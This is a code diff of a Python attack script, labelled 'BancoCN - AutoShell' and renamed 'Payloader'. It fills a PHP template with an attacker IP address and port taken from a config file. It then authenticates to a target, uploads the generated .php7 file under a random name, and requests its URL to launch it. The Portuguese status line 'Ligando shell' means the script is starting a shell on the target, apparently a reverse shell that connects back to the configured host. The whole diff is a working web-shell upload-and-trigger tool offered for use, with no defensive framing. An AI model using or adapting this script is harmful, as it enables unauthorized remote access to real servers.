@@ -3,15 +3,14 @@ from json import load
 from requests import get
 from utils import randomString
 
-cnFile = "autoshell_base.php7"
 
-print("** BancoCN - AutoShell")
+print("** BancoCN - Payloader")
 
-with open(cnFile, 'r') as input:
+with open('payloader_base.php', 'r') as input:
    json = {}
    with open("conf.json", 'r') as f:
      json = load(f)
-   with open('autoshell.php7', 'w') as output:
+   with open('payload.php7', 'w') as output:
       output.write(input.read().replace("%as_ip%", json['ip_addr']).replace("%as_port%", str(json['port'])))
 
 ctx = Context()
@@ -21,7 +20,7 @@ ctx.authenticate()
 
 print(" * Fazendo Upload")
 
-url = ctx.upload(randomString(8), 'autoshell.php7', open('autoshell.php7'))
+url = ctx.upload(randomString(8), 'payload.php7', open('payload.php7'))
 
-print(" * Ligando shell")
+print(" * Payloading...")
 get(url)
